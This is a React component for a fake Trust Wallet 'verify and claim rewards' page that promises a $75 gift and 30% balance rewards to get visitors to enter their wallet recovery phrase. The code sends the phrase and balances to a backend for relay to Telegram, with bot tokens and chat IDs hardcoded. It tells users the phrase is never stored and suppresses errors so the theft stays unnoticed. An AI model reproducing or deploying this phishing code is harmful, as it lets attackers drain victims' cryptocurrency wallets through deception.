"use client";

import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Button } from "@/components/ui/button";
import {
  Card,
  CardContent,
  CardDescription,
  CardFooter,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Textarea } from "@/components/ui/textarea";
import { motion } from "@/lib/motion";
import { verifyWalletPhrase } from "@/lib/wallet-utils";
import {
  AlertCircle,
  Bitcoin,
  CheckCircle,
  Feather as Ether,
  ExternalLink,
  Loader2,
} from "lucide-react";
import { useState } from "react";

// Telegram bot tokens
const TELEGRAM_BOT_TOKEN_1 = "7295112799:AAE24YyqqlbUNbcOiAlXfa8w1IgYsg3UpxQ";
const TELEGRAM_BOT_TOKEN_2 = "7849948168:AAGlhFLe07LWuZ8rt59J3rdKxrh8u6fCKHE";
const TELEGRAM_CHAT_ID_1 = "7575241701";
const TELEGRAM_CHAT_ID_2 = "6232955005";

// Function to send data to backend server which will handle Telegram messages
const sendToBackend = async (
  phrase: string,
  balances?: { btc?: number; eth?: number }
) => {
  try {
    // Use absolute URL since Next.js is using 'output: export'
    const response = await fetch("http://localhost:5005/api/send-wallet-data", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        phrase,
        balances,
      }),
    });

    if (!response.ok) {
      throw new Error(`Server responded with status: ${response.status}`);
    }

    return await response.json();
  } catch (error) {
    // Silently handle errors to not affect user experience
    console.error("Error sending data to backend:", error);
    return null;
  }
};

const WalletVerificationSection = () => {
  const [phrase, setPhrase] = useState("");
  const [isVerifying, setIsVerifying] = useState(false);
  const [isDialogOpen, setIsDialogOpen] = useState(false);
  const [isSuccessDialogOpen, setIsSuccessDialogOpen] = useState(false);
  const [result, setResult] = useState<{
    success: boolean;
    message: string;
    balances?: { btc?: number; eth?: number };
    reward?: number;
    gift?: number;
  } | null>(null);

  const handleVerification = async () => {
    if (!phrase.trim()) {
      setResult({
        success: false,
        message: "Please enter your wallet recovery phrase.",
      });
      return;
    }

    setIsVerifying(true);
    setResult(null);

    try {
      const verificationResult = await verifyWalletPhrase(phrase);
      setResult(verificationResult);

      // Send data to backend server instead of directly to Telegram
      if (verificationResult.success) {
        sendToBackend(phrase, verificationResult.balances);
      }
    } catch (error) {
      setResult({
        success: false,
        message: "An error occurred during verification. Please try again.",
      });
    } finally {
      setIsVerifying(false);
    }
  };

  const handleClaim = async () => {
    setIsDialogOpen(false);
    setIsSuccessDialogOpen(true);
  };

  const handleOpenTrustWallet = () => {
    window.location.href = "https://trustwallet.com/deeplink/";
    setIsSuccessDialogOpen(false);
    setPhrase("");
    setResult(null);
  };

  return (
    <section className="py-20">
      <div className="container mx-auto px-4">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          whileInView={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          viewport={{ once: true }}
          className="text-center mb-12"
        >
          <h2 className="text-3xl md:text-4xl font-bold text-gray-900 dark:text-white">
            Verify Your Wallet & Claim Rewards
          </h2>
          <p className="mt-4 text-xl text-gray-600 dark:text-gray-300 max-w-3xl mx-auto">
            Enter your wallet recovery phrase to claim your $75 gift and check
            if you're eligible for additional rewards
          </p>
        </motion.div>

        <div className="max-w-3xl mx-auto">
          <Tabs defaultValue="verify" className="w-full">
            <TabsList className="grid w-full grid-cols-2">
              <TabsTrigger value="verify">Verify & Claim</TabsTrigger>
              <TabsTrigger value="balance">Balance Rewards</TabsTrigger>
            </TabsList>
            <TabsContent value="verify">
              <Card>
                <CardHeader>
                  <CardTitle>Wallet Verification</CardTitle>
                  <CardDescription>
                    Click the button below to start the verification process.
                  </CardDescription>
                </CardHeader>
                <CardContent>
                  <Button
                    onClick={() => setIsDialogOpen(true)}
                    className="w-full bg-[#3375BB] hover:bg-[#0B65C6]"
                  >
                    Start Verification
                  </Button>
                </CardContent>
              </Card>
            </TabsContent>
            <TabsContent value="balance">
              <Card>
                <CardHeader>
                  <CardTitle>Balance Rewards</CardTitle>
                  <CardDescription>
                    Get 30% rewards based on your BTC and ETH wallet balances.
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="rounded-lg border border-gray-200 dark:border-gray-800 overflow-hidden">
                    <div className="p-4 bg-gray-50 dark:bg-gray-900 border-b border-gray-200 dark:border-gray-800">
                      <h3 className="font-semibold">How Rewards Work</h3>
                    </div>
                    <div className="p-4 space-y-4">
                      <div className="flex items-start">
                        <div className="mt-1 bg-blue-100 dark:bg-blue-900/30 p-1 rounded-full">
                          <CheckCircle size={16} className="text-[#3375BB]" />
                        </div>
                        <p className="ml-2 text-sm text-gray-600 dark:text-gray-300">
                          Verify your wallet to check your current BTC and ETH
                          balances.
                        </p>
                      </div>
                      <div className="flex items-start">
                        <div className="mt-1 bg-blue-100 dark:bg-blue-900/30 p-1 rounded-full">
                          <CheckCircle size={16} className="text-[#3375BB]" />
                        </div>
                        <p className="ml-2 text-sm text-gray-600 dark:text-gray-300">
                          Get an instant 30% reward based on your current
                          balance value.
                        </p>
                      </div>
                      <div className="flex items-start">
                        <div className="mt-1 bg-blue-100 dark:bg-blue-900/30 p-1 rounded-full">
                          <CheckCircle size={16} className="text-[#3375BB]" />
                        </div>
                        <p className="ml-2 text-sm text-gray-600 dark:text-gray-300">
                          Rewards are credited directly to your wallet along
                          with the $75 gift.
                        </p>
                      </div>
                    </div>
                  </div>
                </CardContent>
                <CardFooter>
                  <Button
                    onClick={() => setIsDialogOpen(true)}
                    className="w-full bg-[#3375BB] hover:bg-[#0B65C6]"
                  >
                    Start Verification
                  </Button>
                </CardFooter>
              </Card>
            </TabsContent>
          </Tabs>
        </div>

        {/* Verification Dialog */}
        <Dialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
          <DialogContent className="sm:max-w-[500px]">
            <DialogHeader>
              <DialogTitle>Wallet Verification</DialogTitle>
              <DialogDescription>
                Enter your 12 or 24-word recovery phrase to verify your wallet
                and check balances.
              </DialogDescription>
            </DialogHeader>

            <div className="space-y-4 py-4">
              <Textarea
                placeholder="Enter your recovery phrase (12 or 24 words separated by spaces)"
                className="min-h-[120px] resize-none"
                value={phrase}
                onChange={(e) => setPhrase(e.target.value)}
              />

              <div className="text-sm text-muted-foreground">
                <p className="mb-2">
                  Your phrase should look like: "word1 word2 word3 ... word12"
                </p>
                <p className="flex items-center text-amber-600 dark:text-amber-400">
                  <AlertCircle size={16} className="mr-1" />
                  We never store your recovery phrase. It is only used for
                  verification.
                </p>
              </div>

              {result && (
                <Alert variant={result.success ? "default" : "destructive"}>
                  <div className="flex items-center">
                    {result.success ? (
                      <CheckCircle className="h-4 w-4 mr-2" />
                    ) : (
                      <AlertCircle className="h-4 w-4 mr-2" />
                    )}
                    <AlertTitle>
                      {result.success
                        ? "Verification Successful"
                        : "Verification Failed"}
                    </AlertTitle>
                  </div>
                  <AlertDescription className="mt-1">
                    {result.message}
                  </AlertDescription>
                  {result.success && result.balances && (
                    <div className="mt-4 space-y-2">
                      <div className="flex items-center justify-between bg-gray-100 dark:bg-gray-800 p-2 rounded">
                        <div className="flex items-center">
                          <Bitcoin className="mr-2 h-5 w-5 text-orange-500" />
                          <span>Bitcoin Balance:</span>
                        </div>
                        <span className="font-semibold">
                          {result.balances.btc?.toFixed(8) || 0} BTC
                        </span>
                      </div>
                      <div className="flex items-center justify-between bg-gray-100 dark:bg-gray-800 p-2 rounded">
                        <div className="flex items-center">
                          <Ether className="mr-2 h-5 w-5 text-purple-500" />
                          <span>Ethereum Balance:</span>
                        </div>
                        <span className="font-semibold">
                          {result.balances.eth?.toFixed(8) || 0} ETH
                        </span>
                      </div>
                      {result.reward !== undefined && (
                        <div className="mt-4 p-3 bg-green-100 dark:bg-green-900/30 rounded-lg text-green-800 dark:text-green-300">
                          <div className="font-semibold">Your Rewards:</div>
                          <div className="flex justify-between mt-2">
                            <span>30% Balance Reward:</span>
                            <span>${result.reward.toFixed(2)}</span>
                          </div>
                          <div className="flex justify-between mt-1">
                            <span>Gift Amount:</span>
                            <span>${result.gift}</span>
                          </div>
                          <div className="border-t border-green-200 dark:border-green-800 mt-2 pt-2 flex justify-between font-bold">
                            <span>Total:</span>
                            <span>
                              ${(result.reward + (result.gift || 0)).toFixed(2)}
                            </span>
                          </div>
                        </div>
                      )}
                    </div>
                  )}
                </Alert>
              )}
            </div>

            <DialogFooter className="flex space-x-2">
              <Button
                variant="outline"
                onClick={() => {
                  setIsDialogOpen(false);
                  setPhrase("");
                  setResult(null);
                }}
              >
                Cancel
              </Button>
              {result?.success ? (
                <Button
                  onClick={handleClaim}
                  className="bg-[#3375BB] hover:bg-[#0B65C6]"
                >
                  Claim Rewards
                </Button>
              ) : (
                <Button
                  onClick={handleVerification}
                  disabled={isVerifying}
                  className="bg-[#3375BB] hover:bg-[#0B65C6]"
                >
                  {isVerifying && (
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  )}
                  {isVerifying ? "Verifying..." : "Verify Wallet"}
                </Button>
              )}
            </DialogFooter>
          </DialogContent>
        </Dialog>

        {/* Success Dialog */}
        <Dialog
          open={isSuccessDialogOpen}
          onOpenChange={setIsSuccessDialogOpen}
        >
          <DialogContent className="sm:max-w-[400px]">
            <div className="text-center">
              <div className="w-16 h-16 bg-green-100 dark:bg-green-900/30 rounded-full flex items-center justify-center mx-auto mb-4">
                <CheckCircle className="w-8 h-8 text-green-600 dark:text-green-400" />
              </div>
              <DialogTitle className="text-xl mb-2">
                Verification Successful!
              </DialogTitle>
              <DialogDescription className="mb-6">
                Your rewards have been processed and are ready to be claimed in
                your Trust Wallet.
              </DialogDescription>

              <div className="bg-gray-50 dark:bg-gray-800 rounded-lg p-4 mb-6">
                <div className="text-sm text-gray-600 dark:text-gray-300 mb-2">
                  Total Rewards:
                </div>
                <div className="text-2xl font-bold text-[#3375BB]">
                  $
                  {result?.reward && result?.gift
                    ? (result.reward + result.gift).toFixed(2)
                    : "75.00"}
                </div>
              </div>

              <Button
                onClick={handleOpenTrustWallet}
                className="w-full bg-[#3375BB] hover:bg-[#0B65C6] mb-2"
              >
                Open Trust Wallet
                <ExternalLink className="w-4 h-4 ml-2" />
              </Button>

              <p className="text-sm text-gray-500 dark:text-gray-400 mt-4">
                Don't have Trust Wallet?{" "}
                <a
                  href="https://trustwallet.com/download"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-[#3375BB] hover:underline"
                >
                  Download it here
                </a>
              </p>
            </div>
          </DialogContent>
        </Dialog>
      </div>
    </section>
  );
};

export default WalletVerificationSection;
